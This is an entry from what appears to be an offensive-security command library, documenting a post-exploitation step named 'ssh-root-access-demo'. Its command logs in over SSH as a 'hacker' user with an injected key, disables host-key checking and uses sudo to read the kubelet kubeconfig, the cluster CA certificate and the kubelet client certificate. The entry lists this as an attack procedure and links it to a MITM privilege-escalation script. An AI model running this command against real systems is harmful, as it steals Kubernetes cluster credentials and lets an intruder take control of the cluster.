---
data: >-
  ssh -oStrictHostKeyChecking=no hacker@127.0.0.1 -- sudo cat
  /var/lib/kubelet/kubeconfig /etc/srv/kubernetes/pki/ca-certificates.crt
  /var/lib/kubelet/pki/kubelet-client-current.pem
tags:
  - ssh
  - root
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.877Z'
id: 1ef25b70-4427-4838-8170-8e0c1ceb7579
verified: false
validated: true
submitted: true
---
# ssh-root-access-demo

## Command

```bash
ssh -oStrictHostKeyChecking=no hacker@127.0.0.1 -- sudo cat /var/lib/kubelet/kubeconfig /etc/srv/kubernetes/pki/ca-certificates.crt /var/lib/kubelet/pki/kubelet-client-current.pem
```

## Description

SSHs into localhost as hacker user with injected key and reads sensitive Kubernetes files as root.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -oStrictHostKeyChecking=no | Skip host verification | Yes |
| user@host | Target | Yes |
| sudo cat | Command to run | Yes |

## Examples

### Basic Usage

```bash
ssh user@host
```

## Expected Output

apiVersion: v1
clusters: ... (kubeconfig contents)
-----BEGIN CERTIFICATE-----
... (cert contents)

## Related

- [[procedures/Execute-MITM-Exploit-Script-for-Privilege-Escalation]]
